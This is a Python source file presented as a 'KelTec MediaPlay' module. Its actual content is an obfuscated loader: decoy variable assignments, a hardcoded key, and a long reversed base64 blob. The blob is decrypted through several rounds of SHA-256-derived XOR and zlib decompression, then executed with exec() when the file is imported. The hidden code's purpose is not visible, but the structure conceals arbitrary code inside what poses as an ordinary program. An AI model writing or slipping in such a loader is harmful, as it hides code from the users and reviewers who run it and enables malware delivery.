# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 762497 ^ 518647
_lx1_1 = len("f72c32")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-834567)
_lx3_3 = 817877 * 0
_lx4_4 = 507423 ^ 893906
_K = '6ab4e8cea131c210c3e4ae5be51be827ef6517bca25b512402771e2ceac709ff'
_M = 'd1rteDrw3S4gwg=='
_D = '==wWiWqw3ahV6uDHhygX5V2MdcZFVXH8/pN70XPrs0wAaguD7DvBWuF1kQM0XuUEa8CV8PuTnVxGpMlabQ8xGOP0KqSeaXmAf4+cXfjWHZMUZ7MHuCTGaXv5ILk5DmJq9U0VR15PqpJG82BNyQdtv3x/LPRVIKYcaT/yXNScjZcrZtGeHEyIDK/vNHTg0cpHyiKQscVZGGDZQUjpGH7vOi9P9qxTwKdvyhTZ/slsVd1ZAG+UJnTkcJypiAvj84C2pICfXujn+7LMia3LDZBr/Zkp+AUFM8gAgXbpLw/2UcDHjMuP3PYC1S6An6i2h60CtIPca+MIZyhLFJivXn03xWICc+XtmgbA4LlvVHoLR8YR6YbxMVdCUW+UHGKhIwyCVpS7BxpqIEQPAIGtEh4OznJ1AcNk9PM280MnM8MyIl0eYAriURqJH2Qp+jyeGPuTSSGBgY3dxDMV8+VIy3hgECJRcfhJwWcTXOLmfI6WGGr3iNzL4C6rLyexZ1QMc0UnYtNQm4xE9B/h1sYm2JX9IDi66GAzybFAhGE8derVGofo5zfXFuM8VhXaBXK1HnyAFiB1PcR4ErosHVmXjXEbRYH0ZuxSiykL0kHB3FXNKdm5nEM0DZKso/x2JFdxDJjvWv9+5krpT0dyUPv6xz2HW9UKqDVbt2i4vu7n2Tbsrs18yJaUNJ1uZ4PeePC5fb2RGYrcKzfVkA2au3Gzhsd1VuGdO+GnRX5UWzef3mYKqbHZ6A7Y0e/bo4bmqH9OvJDXAfCl+TC/FTOMIDfxPqxIrkl8KhKwVFtbUHc6n6VSJ3/efEtrT0/hH4A33MtLU6FqPP6/lZ15ieAKvVqSfALWERTqCoweMvtau/SFa4PA75OTLs6PMb7J+AMRnBwL5of23FXV3yMvNCKqAGeZne+pmGm2kw3awiE5eB3oINRp85Zl3tTPGlxhU14tNtuWwMRh+jYjl46Ng5QYp0Z6dIYoqb6YlpQ6Gzw5V6OsdUXKONmEMgUQoAEl9ERYh9RtzPqByPHTPGmadXGXFoNylY5wf9+NVKQWuWjFKm5Wd4VADNKjPtdofYxmFP6zqpuGb+o3xAgiFIgKSjLmlSX4tk4G1c2+WVllmzIFvaI81vP++KLVphOUPOOyX4EZSIUoNxDX1Nq3hJeaTnz+MdYCCfyIaIpIT7Jk7lavqZczM68Siw4Pvgs0yBne6UrOq4BXFkiCTV1wo9H4O4fTzmx7UX/jKo+zyO+oIRLrUe6HQtJetYvxlKf2cPS7+L2nBIblorJ9fVPy0+RIyuhMHjsf43Whk217B+UNLUzeZ3hX8CV+kCcAkkbnCCE5/aGlTFK0dg9k69mS8xwDh5t6RoEtV4qpvhZyEPihv+j8VRCr2FBZwEED9nCKeCHcgd6VTzfrCTBYfena3btOXoOC8RcwipOEKLldKs0PFrF/7hw3DRZiOpFUXUBB47LhvmYZqwLthPcyVyAj0nPNvNnjfEQ+P7eB7b2nN6WrCghaPxKQ3aZqj2cqNqArA+8lK1Z5BpAR/8qWazaxeL9hKNCVKeVOjRWC6ikQebxNAtVH9/pAn8huIkK48Ihtt7g2r4FToYq1l6iGWyKIzHWCj1fGv7PH/4WMyWhAsrn103G73Us/mTWA9PGeHLZz+UbyLBwk6DYz27oryR3xieFhsg3E8TAjWpoGwfK6FSHuFnlZYPj1FqmQEkr8+di7niSrv60FHIe0rTjP39JRZUPMXPycK8BnLDOegNM2E/LHE7gX35ntKt/dSTzYcOjUJcoCQtJADGfqz5R4GChjYHhezcPR/LOlG0/HQh4xB/8tfotVTdmW'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
